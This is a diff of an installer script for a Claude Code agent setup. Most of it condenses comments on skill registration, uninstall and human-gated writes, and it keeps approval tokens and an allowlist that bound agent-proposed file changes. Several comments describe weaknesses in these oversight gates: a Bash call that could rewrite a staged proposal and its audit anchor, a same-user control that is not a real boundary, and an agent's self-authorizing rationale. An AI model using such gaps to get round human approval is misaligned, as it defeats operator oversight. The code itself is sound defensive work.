-    # real per-file history from day one and never needs the historical-
-    # commit-fetch legacy-bootstrap fallback for anything installed from here on.
+    # Snapshot exactly what this install wrote, so --update has per-file
+    # history from day one.
     receipt["shipped"] = _shipped_snapshot(target, written + ROOT_FILES)
-    # R2: the bytes that landed, measured, so the contract can prove the tree
-    # it ran inside is still the tree this install wrote.
+    # Measure the bytes that landed so the contract can prove they're unchanged.
     _record_installed_sha(target, receipt)
     _save_receipt(target, receipt)
 
@@ -927,26 +743,13 @@ def install(target: Path, into: bool = False):
     return 0
 
 
-# --- SEED-080: registration is decided by ORIGIN, not by name ---------------
-# A recipient who already runs these skills at USER scope (~/.claude/skills)
-# is the normal case on a fleet host, and registering a second project-scoped
-# copy of the same file is how two doors appear. Name alone cannot tell "the
-# same skill, already installed" from "a different skill that happens to
-# share a name", and a --defer flag cannot either: a flag has to be remembered
-# on every host, and that remembering is exactly what failed here in the week
-# this was written. So the question the installer asks is about ORIGIN: is the
-# file at user scope the same body as the one we ship?
-#
-# Same body  -> DEFER. Record it; register nothing; the user-scope copy wins.
-# Different  -> REFUSE, loudly, naming BOTH paths. Never overwrite, never
-#               silently shadow: the operator decides which one is theirs.
-# Absent     -> register, exactly as before.
-#
-# The hash is computed at install time from both files. Nothing is injected
-# into the shipped SKILL.md to carry it: a fleet copy has no such field to
-# read, so every fleet --update would hit the refuse branch, and injecting one
-# would break the byte-identical property that makes the seed copy and the
-# fleet copy one file rather than two.
+# --- skill registration is decided by ORIGIN, not by name -------------------
+# If a skill of the same name exists at user scope (~/.claude/skills):
+#   same body  -> DEFER: record it, register nothing; the user-scope copy wins.
+#   different  -> REFUSE loudly, naming both paths; never overwrite or shadow.
+#   absent     -> register.
+# The hash is computed at install time from both files; nothing is injected
+# into the shipped SKILL.md, which must stay byte-identical to its source.
 def _body_sha(path: Path) -> str:
     """Identity of a skill's text, insensitive to trailing-newline churn."""
     try:
@@ -982,12 +785,7 @@ def _apply_origin_rule(name: str, canonical: Path, deferred: list,
         print(f"skill {name!r}: already installed at user scope with the SAME body "
               f"({user}) — deferring to it, registering nothing here.")
         return False
-    # A refusal used to leave NO trace anywhere: no link, no deferral, no
-    # receipt field. The install exited 0, --audit check 1 said PASS, and the
-    # operator had an install with a silently missing skill and nothing that
-    # would ever mention it again (2026-09-19 review, finding 5, executed as
-    # refusal_not_recorded). A decision the system made is state the system
-    # owns.
+    # Record the refusal so it stays visible to --audit.
     if refused is not None:
         refused.append({"name": name, "user_scope_path": str(user),
                         "user_sha": sha, "seed_sha": _body_sha(canonical),
@@ -1003,9 +801,7 @@ def _apply_origin_rule(name: str, canonical: Path, deferred: list,
 
 
 def _iter_skill_dirs(skills_root: Path):
-    """Yield (name, canonical SKILL.md path) for each real skill under a
-    skills/ tree — a directory containing SKILL.md, not a shared doc like
-    skills/LAYERS.md sitting at the top level."""
+    """Yield (name, SKILL.md path) for each skill directory under skills_root."""
     if not skills_root.is_dir():
         return
     for entry in sorted(skills_root.iterdir()):
@@ -1015,31 +811,18 @@ def _iter_skill_dirs(skills_root: Path):
 
 
 def _shipped_skill_names() -> list:
-    """Skill names this clone would install, read from the SOURCE tree
-    (HERE / "skills") — used for the pre-write --into collision check, since
-    at that point target/skills/ doesn't exist yet to enumerate instead."""
+    """Skill names this clone would install, read from the source tree (for
+    the pre-write --into collision check)."""
     return [name for name, _ in _iter_skill_dirs(HERE / "skills")]
 
 
 def _merge_deferred(receipt: dict, deferred: list):
-    """Merge deferrals INTO the caller's in-memory receipt. A deferral is a
-    live dependency on a file OUTSIDE this install: if the user-scope twin is
-    edited later, this install is quietly running a skill it never saw, and
-    _verify_deferred_skills re-checks exactly these records at audit time.
+    """Merge deferrals into the caller's in-memory receipt.
 
-    In-memory, and returning nothing, ON PURPOSE. Until 2026-09-18 this
-    function loaded the receipt from disk, merged, and saved — while BOTH its
-    callers sat between an earlier `_init_receipt`/`_load_receipt` and a later
-    `_save_receipt(target, receipt)` of their own. That final save wrote a dict
-    that had never seen the deferrals and silently erased them: a textbook lost
-    update, on every fresh install and every --update. The deferral was decided
-    and printed correctly, so the only visible symptom was that
-    _verify_deferred_skills had ZERO subjects and could never fire — a watchdog
-    watching nothing. Caught by CI run 35406434862 (`assert 'improve' in d` ->
-    AssertionError: []) on the first publish that ever ran the step.
-
-    Keeping this pure means a future caller cannot reintroduce the race: there
-    is no second writer to lose to."""
+    A deferral is a live dependency on a file outside this install, re-checked
+    by _verify_deferred_skills at audit time. Deliberately in-memory only: both
+    callers save the receipt themselves afterwards, so a load-and-save here
+    would be lost (overwritten) by that later save."""
     if not deferred:
         return
     existing = {d["name"]: d for d in receipt["install"].get("deferred_skills", [])}
@@ -1049,14 +832,11 @@ def _merge_deferred(receipt: dict, deferred: list):
 
 
 def _merge_refused(receipt: dict, refused: list, seen: list = None):
-    """Merge refusals INTO the caller's in-memory receipt — same seam, and the
-    same purity rule, as _merge_deferred (see its docstring for why this must
-    not load-and-save on its own).
+    """Merge refusals into the caller's in-memory receipt (same rule as
+    _merge_deferred).
 
-    `seen` is the set of skill names this pass actually re-decided; a name in
-    it that is NOT in `refused` has been resolved, and its record is dropped.
-    Accretion needs a removal path (PRINCIPLES 23), or the receipt just gets
-    less true while looking the same size."""
+    A name in `seen` but not in `refused` has been resolved; its record is
+    dropped."""
     existing = {d["name"]: d for d in receipt["install"].get("refused_skills", [])}
     for name in (seen or []):
         existing.pop(name, None)
@@ -1067,8 +847,7 @@ def _merge_refused(receipt: dict, refused: list, seen: list = None):
 
 
 def _verify_refused_skills(target: Path, receipt: dict) -> list:
-    """A refused skill is a live, unresolved collision. It is FLAGGED on every
-    audit until it is resolved — never silence."""
+    """Flag every recorded refused skill on each audit until it is resolved."""
     problems = []
     for d in receipt.get("install", {}).get("refused_skills", []) or []:
         name = d["name"]
@@ -1082,9 +861,8 @@ def _verify_refused_skills(target: Path, receipt: dict) -> list:
 
 
 def _verify_deferred_skills(target: Path, receipt: dict) -> list:
-    """Re-run the origin question at audit time, against the file as it is
-    NOW. Recorded-and-forgotten is the failure mode: the twin was the same
-    body once, which says nothing about today."""
+    """Re-run the origin check at audit time against each deferred-to file as
+    it is now."""
     problems = []
     for d in receipt.get("install", {}).get("deferred_skills", []) or []:
         name, user = d["name"], Path(d["user_path"])
@@ -1108,19 +886,11 @@ def _verify_deferred_skills(target: Path, receipt: dict) -> list:
 
 
 def _register_new_skills(target: Path) -> tuple:
-    """SEED-076's --update calls this, never _register_skills(): that
-    function's own docstring says its assertion is a fresh-install-only
-    backstop that "must never be the first place a collision is
-    discovered" — true for install(), false for --update, which by design
-    RE-RUNS against a target that already has every previously-shipped
-    skill registered. Calling _register_skills() there crashed on the
-    first live test of this feature (every already-registered skill
-    tripped the "should be impossible" assert). This is the idempotent
-    twin: skip a skill that's already correctly linked, register one
-    that's missing entirely, and treat anything else (a real file sitting
-    where the symlink should be, or a symlink pointing somewhere else) as
-    a conflict to report rather than something to crash or silently
-    overwrite. Returns the list of NEWLY registered skill names."""
+    """Idempotent skill registration for --update.
+
+    Skips skills already correctly linked, registers missing ones, and reports
+    (rather than overwrites) a link that exists but points elsewhere.
+    Returns (registered, deferred, refused, seen)."""
     claude_skills = target / ".claude" / "skills"
     registered, conflicts = [], []
     deferred, refused, seen = [], [], []
@@ -1148,24 +918,13 @@ def _register_new_skills(target: Path) -> tuple:
 
 
 def _register_skills(target: Path) -> tuple:
-    """SEED-071: shipping skills/<name>/SKILL.md is not enough — Claude Code
-    only discovers skills at ~/.claude/skills/ (user-level) or .claude/skills/
-    (project-level, searched upward from the working directory). Nothing
-    wrote either, so a fresh install's skills were invisible until an
-    operator registered them by hand. Project-level is the right home here:
-    it works the moment an agent's cwd is anywhere under --target, needs no
-    write to the recipient's global ~/.claude/, and composes cleanly with
-    --into (a recipient's own global skills are untouched).
+    """Register shipped skills at project level (.claude/skills/<name>).
 
-    Symlinks (not copies) so the canonical file — the one skill-center's
-    audit.py lints and scaffold.py's plan describes — stays the single
-    source of truth; relative targets so the whole tree can be moved without
-    breaking the link. Collisions are refused before this runs (install()'s
-    --into pre-check, alongside COMPONENTS/ROOT_FILES) — the assertion below
-    is a belt-and-suspenders backstop, not the primary guard: it must never
-    be the first place a collision is discovered, since skills/ and every
-    other component are already on disk by the time this function runs.
-    Returns the list of registered skill names."""
+    Claude Code discovers skills only at ~/.claude/skills or a project-level
+    .claude/skills; project level needs no global write. Relative symlinks keep
+    skills/ the single source of truth. Collisions are refused earlier by
+    install(); the assert is only a backstop.
+    Returns (registered, deferred, refused)."""
     claude_skills = target / ".claude" / "skills"
     registered = []
     deferred, refused = [], []
@@ -1196,11 +955,8 @@ def enable_demo(target: Path):
 
 
 def _install_default_jobs(target: Path) -> list:
-    """SEED-070/074: unlike hello_fleet (opt-in via --enable-demo), these are
-    written into a fresh install's manifest unconditionally — see each job
-    constant's own comment for why it's safe to default on. Returns the list
-    of job names installed this call (a name is omitted if it was already
-    present, e.g. a repeat run somehow reached this point)."""
+    """Write the default jobs into a fresh install's manifest (hello_fleet stays
+    opt-in). Returns the names newly added."""
     manifest = target / "scheduler" / "manifest.yml"
     installed = []
     jobs = [("repo_hygiene", JOB_REPO_HYGIENE), ("freshness", JOB_FRESHNESS)]
@@ -1213,10 +969,8 @@ def _install_default_jobs(target: Path) -> list:
 
 
 def enable_governance(target: Path):
-    """Copy the governance/ tree into an existing install — opt-in only,
-    never part of the default COMPONENTS copy (SEED-065). Idempotent:
-    refuses if governance/ already exists there rather than silently
-    overwriting a possibly-customized policy.yml."""
+    """Copy governance/ into an existing install (opt-in only). Refuses if it
+    already exists, since policy.yml may be customized."""
     if not (target / "PRINCIPLES.md").exists():
         return die(f"{target} doesn't look like an AI-OS Seed install — is --target correct?")
     dest = target / "governance"
@@ -1226,10 +980,7 @@ def enable_governance(target: Path):
         return 0
     src = HERE / "governance"
     if not src.exists():
-        # WITHHELD 2026-07-31, not missing. Distinguish the two: the old message
-        # here told the user their clone was incomplete and to re-clone, which
-        # would send them round a loop that can never succeed against a build
-        # that deliberately doesn't carry this tree.
+        # Withheld from this release, not missing — don't tell the user to re-clone.
         return die("governance/ is withheld in this release — your clone is fine.\n"
                     "The informed-approval control was unsound (an allowed Bash call "
                     "could rewrite a staged proposal and its audit anchor while the "
@@ -1250,7 +1001,7 @@ def _memory_is_pristine(p: Path) -> bool:
     user (or their agent) has made it theirs."""
     shipped = HERE / "memory"
     if not shipped.is_dir():
-        return False  # can't prove pristine -> keep (degrade toward safety)
+        return False  # can't prove pristine -> keep
     ours = sorted(f.name for f in shipped.iterdir() if f.is_file())
     theirs = sorted(f.name for f in p.iterdir())
     if ours != theirs:
@@ -1259,9 +1010,8 @@ def _memory_is_pristine(p: Path) -> bool:
 
 
 def _tree_is_pristine(shipped: Path, installed: Path) -> bool:
-    """Recursive byte-identical check (governance/'s policy.yml is very
-    plausibly org-customized after a real governance install — same
-    keep-if-touched caution as memory/, generalized)."""
+    """Recursive byte-identical check (governance/'s policy.yml is often
+    customized)."""
     if not shipped.is_dir() or not installed.is_dir():
         return False
     cmp = filecmp.dircmp(shipped, installed)
@@ -1276,12 +1026,8 @@ def uninstall(target: Path):
     if not (sync.exists() and manifest.exists() and (target / "PRINCIPLES.md").exists()):
         return die(f"{target} doesn't look like an AI-OS Seed install — refusing "
                    f"to delete it. Remove it yourself if you're sure.")
-    # SEED-071: undo exactly the symlinks _register_skills() created, before
-    # skills/ itself is removed below — otherwise .claude/skills/<name>/
-    # is left holding a dangling symlink into a now-deleted directory.
-    # Read from the receipt (what THIS installer actually registered), never
-    # blind-globbed off .claude/skills/, since that directory may also hold
-    # skills the recipient registered themselves, before or after installing.
+    # Remove exactly the skill symlinks this installer registered (per the
+    # receipt) before skills/ goes; .claude/skills/ may also hold the user's own.
     receipt = _load_receipt(target)
     registered = (receipt or {}).get("install", {}).get("registered_skills", [])
     for name in registered:
@@ -1308,27 +1054,19 @@ def uninstall(target: Path):
               file=sys.stderr)
     else:
         print("scheduled jobs removed.")
-    # Remove ONLY the seed's own names, never the tree wholesale — a --into
-    # install shares its root with the user's workspace, and even a dedicated
-    # root may have grown user content (NOW.md, memory notes, their CLAUDE.md).
+    # Remove only the seed's own names: the root may also hold user content.
     for name in COMPONENTS + OPTIONAL_COMPONENTS + ROOT_FILES:
         p = target / name
         if not p.exists() and name in OPTIONAL_COMPONENTS:
-            continue  # never enabled — nothing to remove, nothing to warn about
+            continue  # never enabled
         if name == "memory" and p.is_dir() and not _memory_is_pristine(p):
-            # memory/ is the user's brain and notes are irreplaceable: it is
-            # only deleted when byte-identical to the shipped scaffold (a
-            # provably untouched install). Any note, edit, or a pre-existing
-            # workspace memory (a composed install never wrote here at all)
-            # makes it theirs — kept, unconditionally. Cheap to delete by
-            # hand; impossible to undo.
+            # memory/ is deleted only when byte-identical to the shipped
+            # scaffold; otherwise it is the user's and is kept.
             print(f"kept {p} — it differs from the shipped scaffold, so it's "
                   f"yours, not the seed's; delete it yourself if you're sure.")
             continue
         if name == "governance" and p.is_dir() and not _tree_is_pristine(HERE / "governance", p):
-            # Same caution as memory/: a real governance install very likely
-            # customized policy.yml (org name, overlays) — kept unless
-            # provably untouched.
+            # Same rule as memory/: policy.yml is likely customized.
             print(f"kept {p} — it differs from the shipped scaffold (likely a "
                   f"customized policy.yml), so it's yours; delete it yourself if you're sure.")
             continue
@@ -1336,8 +1074,7 @@ def uninstall(target: Path):
             shutil.rmtree(p)
         elif p.exists():
             p.unlink()
-    # The receipt/staged scaffold is install.py's own bookkeeping, not the
-    # user's — always drop it on uninstall.
+    # install.py's own bookkeeping — always removed.
     cc_seed_dir = target / CC_SEED_DIR
     if cc_seed_dir.is_dir():
         receipt_file = cc_seed_dir / RECEIPT_NAME
@@ -1348,9 +1085,7 @@ def uninstall(target: Path):
             shutil.rmtree(staged)
         if cc_seed_dir.is_dir() and not any(cc_seed_dir.iterdir()):
             cc_seed_dir.rmdir()
-    # Its out-of-target mirror (F1 fix) is the same bookkeeping, just
-    # anchored elsewhere — drop it too rather than accumulating stale
-    # anchors forever across install/uninstall cycles.
+    # Remove the out-of-target receipt anchor too.
     anchor = _anchor_path(target)
     if anchor.exists():
         anchor.unlink()
@@ -1365,14 +1100,10 @@ def uninstall(target: Path):
     return 0
 
 
-# --- Wave 2H, piece 2: --approve (SEED-069) ---------------------------------
-# install.py, not the agent, performs the two highest-stakes writes. The
-# agent's role stops at staging (claude-md) or showing the fixed command
-# (mesh-bootstrap); a human runs --approve, which hashes what it's about to
-# apply, records that hash in the receipt under a key the agent's own write
-# path can't set, and only then moves the bytes — in the same step, so there
-# is no window between "recorded as approved" and "written" for an agent to
-# race.
+# --- --approve: install.py, not the agent, performs gated writes -----------
+# The agent stages (claude-md) or shows the command (mesh-bootstrap); a human
+# runs --approve, which hashes what it applies, records the hash in the
+# receipt and writes the bytes in the same step.
 
 def approve(target: Path, which: str, from_pack: str = None, replace: bool = False, tag: str = None,
             allowed_signers: str = None, allow_unsigned: bool = False):
@@ -1418,22 +1149,16 @@ def _approve_claude_md(target: Path, receipt: dict) -> int:
     try:
         staged.rename(staged.with_suffix(".approved"))
     except OSError:
-        pass  # non-fatal — the receipt is the record of truth, not the staged file
+        pass  # non-fatal — the receipt is the record of truth
     print(f"CLAUDE.md region approved and written — hash {proposed_hash}")
     print(f"recorded in {target}/{CC_SEED_DIR}/{RECEIPT_NAME}")
     return 0
 
 
 def _mesh_store_dir(target: Path):
-    """The workspace's actual Claude Code auto-memory store —
-    ~/.claude/projects/<slug of target>/memory/, derived by mesh_lib's own
-    store_dir(), NOT <ROOT>/memory/. install.sh's Phase 5 step 3 mutates
-    THIS path (MEMORY.md flip to GENERATED, MEMORY.md.pre-mesh backup);
-    <ROOT>/memory/ is the shipped scaffold/doc copy and is never touched by
-    the bootstrap. Discovered live while testing this wave — the v2 spec
-    assumed <ROOT>/memory/ was the mutation target; it isn't. Imported from
-    the target's own shipped mesh_lib.py rather than re-derived here, so the
-    formula can never drift from the one install.sh actually uses."""
+    """The workspace's Claude Code auto-memory store, as computed by the
+    target's own mesh_lib.store_dir() — not <ROOT>/memory/. This is the path
+    install.sh mutates."""
     code = target / "memory-mesh"
     if not (code / "mesh_lib.py").exists():
         return None
@@ -1457,9 +1182,7 @@ def _approve_mesh_bootstrap(target: Path, receipt: dict) -> int:
     print(f"running: bash {script}")
     r = subprocess.run(["bash", str(script)])
     if r.returncode != 0:
-        # Recorded as a FAILED attempt, not left absent: an operator who reruns
-        # --audit should see that bootstrap was tried and did not complete,
-        # rather than an install that looks like it was never bootstrapped.
+        # Record the failed attempt so --audit shows bootstrap was tried.
         receipt.setdefault("gated_writes", {})["mesh-bootstrap"] = {
             "approved_at": _now(), "written": False,
             "error": f"memory-mesh/install.sh exited {r.returncode}",
@@ -1467,7 +1190,7 @@ def _approve_mesh_bootstrap(target: Path, receipt: dict) -> int:
         _save_receipt(target, receipt)
         return die(f"memory-mesh/install.sh exited {r.returncode} — not recorded "
                    f"as approved (the failing step is named above).")
-    store = _mesh_store_dir(target)  # re-derive: install.sh itself may be what created mesh_lib's importability
+    store = _mesh_store_dir(target)  # re-derive: install.sh may have made mesh_lib importable
     post_memory_md = (store / "MEMORY.md") if store else None
     post_hash = _sha256_file(post_memory_md) if post_memory_md and post_memory_md.exists() else None
     receipt.setdefault("gated_writes", {})["mesh-bootstrap"] = {
@@ -1482,14 +1205,10 @@ def _approve_mesh_bootstrap(target: Path, receipt: dict) -> int:
     return 0
 
 
-# --- SEED-080: --approve memory-hooks ---------------------------------------
-# The mesh ships five hooks and, until this verb, wired none of them: the
-# retrieval channel sat inert and the one-door rule was prose. Wiring a hook
-# is self-modification of the agent's own harness, so it is a gated write with
-# a human at the gate — shown as an exact settings.json diff, applied in the
-# same step that records it, and REVOCABLE: --revoke memory-hooks removes
-# exactly the entries this recorded, restoring the prior bytes. An approval
-# with no undo is a trap, not a gate.
+# --- --approve memory-hooks -------------------------------------------------
+# Wiring hooks modifies the agent's own harness, so it is a gated write: shown
+# as an exact settings.json diff, recorded as applied, and revocable via
+# --revoke memory-hooks, which removes exactly the recorded entries.
 MEMORY_HOOKS = [
     # (event, matcher or None, command tail relative to the install root)
     ("UserPromptSubmit", None, "memory-mesh/retrieve.py"),
@@ -1505,16 +1224,12 @@ MEMORY_HOOKS = [
 
 
 def _memory_hook_entries(target: Path) -> dict:
-    """The settings.json fragment this verb writes, with absolute paths into
-    THIS install — a relative hook command resolves against the agent's cwd,
-    which is not a promise any harness makes."""
+    """The settings.json fragment this verb writes, using absolute paths into
+    this install (a relative command would resolve against the agent's cwd)."""
     out = {}
     for event, matcher, tail in MEMORY_HOOKS:
         parts = tail.split(" ", 1)
-        # Quoted: a legal --target containing a space installed and approved
-        # cleanly, then bash split the hook command and python could not open
-        # the script (2026-09-19 review, finding 13, executed as
-        # hook_path_spaces: exit 2 naming the truncated path).
+        # Quoted so a --target containing spaces still works.
         cmd = f"{shlex.quote(sys.executable)} {shlex.quote(str(target / parts[0]))}"
         if len(parts) > 1:
             cmd += " " + parts[1]
@@ -1545,20 +1260,13 @@ def _approve_memory_hooks(target: Path, receipt: dict) -> int:
         return die(f"{settings} is not valid JSON ({e}) — refusing to touch it.")
     adding = _memory_hook_entries(target)
     hooks = doc.setdefault("hooks", {})
-    # Dedup on (event, matcher, command), not on "this string appears anywhere
-    # in the hooks blob". A pre-existing UserPromptSubmit entry for retrieve.py
-    # used to suppress the PostToolUse entry for the SAME script — which was
-    # then still recorded in the receipt as approved, so the audit and the
-    # watcher looked for something that had never been written (2026-09-19
-    # review, finding 4, executed as existing_command_skips_other_event).
+    # Dedup on (event, matcher, command), not on substring presence.
     present = _wired_hook_keys(doc)
     added, already_present = {}, {}
     for event, entries in adding.items():
         bucket = hooks.setdefault(event, [])
         for entry in entries:
             cmd = entry["hooks"][0]["command"]
-            # (event, matcher, command) — the comment above has said this since
-            # round 1; the code keyed on (event, command) until round 2 (R4).
             if (entry.get("matcher") or "", cmd) in present.get(event, ()):
                 already_present.setdefault(event, []).append(cmd)
                 continue
@@ -1568,10 +1276,8 @@ def _approve_memory_hooks(target: Path, receipt: dict) -> int:
         del hooks[event]
     after = (json.dumps(doc, indent=2) + "\n").encode()
     if after == before:
-        # Nothing new to write — but if there is no record at all, revoke and
-        # the audit have no subject, and `--revoke memory-hooks` then dies with
-        # "was never approved on this install" on an install whose hooks ARE
-        # wired (Grok, 2026-09-19). Record the adoption with an empty `entries`.
+        # Nothing new to write. If there is no record, adopt the existing
+        # wiring (empty `entries`) so --revoke and --audit have a subject.
         if not (receipt.get("gated_writes") or {}).get("memory-hooks"):
             receipt.setdefault("gated_writes", {})["memory-hooks"] = {
                 "approved_at": _now(), "written": True, "adopted": True,
@@ -1601,18 +1307,10 @@ def _approve_memory_hooks(target: Path, receipt: dict) -> int:
     _atomic_write(settings, after)
     receipt.setdefault("gated_writes", {})["memory-hooks"] = {
         "approved_at": _now(), "written": True,
-        # ONLY what this install actually added. It used to record every
-        # INTENDED command, including ones the dedup skipped, which made the
-        # receipt a statement of intent rather than of fact — and revoke then
-        # deleted entries it had never written.
+        # Only what this install actually added, so revoke removes nothing else.
         "entries": added, "already_present": already_present,
-        # The IDENTITY of the prior file, never its CONTENT. Until 2026-09-19
-        # this recorded `prior_bytes` -- the user's whole prior
-        # settings.json, which routinely holds env.ANTHROPIC_API_KEY -- and
-        # _save_anchor then copied the entire receipt to
-        # ~/.cache/cc-seed/receipt-anchors/, OUTSIDE the target, where no
-        # uninstall removes it and no audit looks. Nothing ever read the
-        # bytes: revoke removes the recorded entries structurally.
+        # Identity of the prior file, never its content: settings.json can
+        # hold API keys, and the receipt is mirrored outside the target.
         "prior_sha": _sha256_bytes(before), "prior_bytes_len": len(before),
         "after_sha": _sha256_bytes(after),
     }
@@ -1624,28 +1322,17 @@ def _approve_memory_hooks(target: Path, receipt: dict) -> int:
 
 
 def _confirm_hook_write() -> bool:
-    """CI applies the SAME staged diff non-interactively through the existing
-    --approve/--apply shape; it never gets a new --yes flag, because a flag
-    that means "skip the human" is one typo away from being passed by a human.
+    """Interactive y/N gate for hook writes and revokes.
 
-    `--apply` means "I have seen the staged diff and affirm it", so it reads
-    the same on the way OUT as on the way in — --revoke stages a diff and
-    calls this gate exactly as --approve does. Until 2026-09-18 the arg gate
-    refused --apply alongside --revoke, which made a non-interactive revoke
-    unreachable by BOTH paths: with --apply the gate died at argv parsing,
-    and without it this function fell through to input() and took the
-    EOFError branch. Caught by the first CI run that ever exercised it
-    (0.4.0-alpha, run 35404705676); the live check passed because a human
-    typed y."""
+    Non-interactive only with CI=true AND --apply ("I have seen the staged
+    diff and affirm it"); there is deliberately no --yes flag."""
     if os.environ.get("CI") == "true" and "--apply" in sys.argv:
         print("CI=true with --apply — applying the staged diff non-interactively.")
         return True
     try:
         return input("write these entries? [y/N] ").strip().lower() in ("y", "yes")
     except EOFError:
-        # Interactive BY DESIGN — but say WHY, or an automation author sees a
-        # silent "not written." and a rc of 1 with nothing to act on
-        # (2026-09-19, Grok P2).
+        # Say why, so automation sees something actionable.
         print("no TTY to ask on, and CI is not 'true' — this gate is "
               "interactive by design. In automation, run it as: "
               "CI=true install.py --target ... --approve memory-hooks --apply "
@@ -1668,10 +1355,8 @@ def revoke(target: Path, which: str) -> int:
         return die(f"{settings} is gone — nothing to remove.")
     before = settings.read_bytes()
     doc = json.loads(before)
-    # Per EVENT, and per individual hook ITEM. Revoke used to drop every entry
-    # in a group that contained any recorded command, taking a pre-existing
-    # operator hook and anything they had appended to the same group with it
-    # (2026-09-19 review, finding 4, executed as revoke_deletes_user_hooks).
+    # Remove per event and per hook item, so the user's own hooks in the same
+    # group survive.
     recorded = {event: set(cmds) for event, cmds in (record.get("entries") or {}).items()}
     hooks = doc.get("hooks", {})
     for event in list(hooks):
@@ -1705,10 +1390,8 @@ def revoke(target: Path, which: str) -> int:
         record, revoked_at=_now(), written=False,
         revoked_sha=_sha256_bytes(after))
     _save_receipt(target, receipt)
-    # `recorded` is a SET of command strings, so this is the number of distinct
-    # commands removed, which is <= the number of recorded hook entries (two
-    # events can register the same command). Say which, or the line reads as a
-    # short count against the receipt — 6 vs 7 on a stock install.
+    # `recorded` is a set, so this counts distinct commands (two events can
+    # share one), which may be fewer than the recorded entries.
     print(f"{which} revoked — {len(recorded)} distinct command(s) removed from {settings}.")
     return 0
 
@@ -1729,52 +1412,30 @@ def contract(target: Path, harness: str = None) -> int:
     return subprocess.run(argv).returncode
 
 
-# --- SEED-072 (2026-08-09): human-applied exact-diff proposal loop ---------
-# Both Grok and Gemini, reviewing this backlog's own third-party assessment,
-# independently proposed the same middle tier between "ambient cron" and a
-# governed action broker: the agent writes a canonical intent (exact bytes,
-# a hash binding what it saw, a rationale) to a file and stops; a human
-# applies it with one command. Same covenant as claude-md/mesh-bootstrap
-# above — the agent's role stops at writing the proposal file, install.py
-# performs the one write — generalized to an open-ended shape (any target,
-# not one bespoke flow per write) but deliberately allowlisted, not opened
-# wide: SEED-072's own AC scopes v1 to scheduler-entry changes only.
-# "Reversible filesystem actions" as a CLASS stays out of the allowlist for
-# good: SEED-073 (the unattended Tier-1 grant) was declined 2026-08-09
-# because a same-uid control is a convention, not a boundary. What widens
-# is the list of NAMED files, one code change at a time.
+# --- human-applied exact-diff proposal loop ----------------------------------
+# The agent writes a canonical proposal (exact bytes, a hash binding what it
+# saw, a rationale) and stops; a human applies it with one command, and
+# install.py performs the write. Targets are an allowlist of NAMED files, never
+# a class. Each must be reversible through this mechanism, system-owned (not
+# human-owned state), and validatable before the write (_PROPOSAL_CHECKS).
 #
-# --- SEED-077 (2026-09-02): widened allowlist ---------------------------
-# SEED-072 ran three weeks on manifest.yml alone in real use, so the lane
-# widens — to NAMED files, never a class. Every entry must be (a)
-# reversible through this same mechanism, (b) owned by the system itself
-# (never human-owned state like goals or ledgers), and (c) validatable
-# before the write (see _PROPOSAL_CHECKS). settings.json's presence is NOT
-# an agent inference — the first submission's rationale ("the lane is
-# doctrine's explicit authorization") was rejected in review as
-# self-authorizing. It is here on Craig's own ruling, 2026-09-02, verbatim:
-# "I am approving the change to settings.json as long as the changes are
-# clearly communicated to me before making them." The condition is
-# enforced in mechanism, not intent: settings.json proposals are excluded
-# from --apply-proposals (PROPOSAL_SINGLE_APPLY_ONLY below); their FULL
-# unified diff prints in --review-proposals and again at --apply-proposal
-# time; and the apply REFUSES unless it carries --confirm TOKEN, where the
-# token is a prefix of the after-content hash that only that diff output
-# prints. "Communicated before making" is therefore two commands by
-# construction (one shows, one writes), and the approval is bound to the
-# exact bytes it was shown, not to the slug name.
+# settings.json is allowed only on the condition that changes are shown before
+# they are made. Enforced in mechanism: it is excluded from --apply-proposals
+# (PROPOSAL_SINGLE_APPLY_ONLY); its full diff prints in --review-proposals and
+# at --apply-proposal; and the apply requires --confirm TOKEN, a prefix of the
+# after-content hash printed only beside that diff — so the approval is bound
+# to the exact bytes shown.
 PROPOSAL_ALLOWED_TARGETS = {
     "scheduler/manifest.yml",
     "observability/freshness.json",
     ".claude/settings.json",
 }
 
-# Targets the batch walker refuses to touch: each apply must be its own
-# deliberate, slug-named human command, with the full diff in front of the
-# human first. Guard-weakening surfaces belong here.
+# Targets the batch walker refuses: each apply is its own slug-named command,
+# with the full diff shown first.
 PROPOSAL_SINGLE_APPLY_ONLY = {".claude/settings.json"}
 
-# Bound every output (Principle): a runaway diff truncates, never floods.
+# Bound output: a runaway diff truncates.
 _PROPOSAL_DIFF_MAX_LINES = 200
 
 
@@ -1797,18 +1458,14 @@ _CONFIRM_LEN = 12
 
 
 def _confirm_token(after_content: str) -> str:
-    """The token --apply-proposal must carry for a single-apply-only target:
-    a prefix of after_content's own hash. It is printed only alongside the
-    full diff, so possessing it means the diff was in front of the human;
-    and it changes if the proposal's bytes change, so a re-staged proposal
-    under the same slug cannot ride an earlier approval."""
+    """The --confirm token for a single-apply-only target: a prefix of
+    after_content's hash. Printed only beside the full diff, and it changes if
+    the proposal's bytes change."""
     return _sha256_bytes(after_content.encode("utf-8")).split(":", 1)[-1][:_CONFIRM_LEN]
 
 
 def _check_json_object(text: str):
-    """after_content must parse as a JSON object — a proposal that would
-    leave freshness.json or settings.json unreadable is refused before the
-    write, not discovered by the next job that loads it."""
+    """Refuse after_content that isn't a JSON object."""
     try:
         parsed = json.loads(text)
     except ValueError as e:
@@ -1819,11 +1476,8 @@ def _check_json_object(text: str):
 
 
 def _check_manifest_yaml(text: str):
-    """Structural sanity for scheduler/manifest.yml without a yaml import
-    (stdlib-first): the jobs key must survive, tabs must not appear (YAML
-    rejects them as indentation), and no two jobs may share a name — each
-    is a mistake an agent-written full-file replacement can realistically
-    make, and each would take the whole scheduler down, not one job."""
+    """Stdlib structural check for scheduler/manifest.yml: the jobs key
+    survives, no tabs, no duplicate job names."""
     if "jobs:" not in text:
         return "no 'jobs:' key — this would empty the scheduler"
     if "\t" in text:
@@ -1837,11 +1491,8 @@ def _check_manifest_yaml(text: str):
     return None
 
 
-# Verification BEFORE apply, not after: each allowlisted target names the
-# check its replacement bytes must pass. A check returns None (pass) or a
-# reason string (refuse). Deliberately a fixed registry keyed by target —
-# proposals never name their own check command; an agent-suppliable
-# verifier is an agent-suppliable no-op.
+# Validity check per allowlisted target, run before apply: returns None (pass)
+# or a reason (refuse). A fixed registry — proposals never name their own check.
 _PROPOSAL_CHECKS = {
     "scheduler/manifest.yml": _check_manifest_yaml,
     "observability/freshness.json": _check_json_object,
@@ -1866,11 +1517,8 @@ _SLUG_RE = re.compile(r"^[a-z0-9][a-z0-9_-]*$")
 
 
 def _validate_slug(slug: str):
-    """A slug becomes a path component in three places (staged, applied,
-    the receipt key) — reject anything that isn't a plain filename-safe
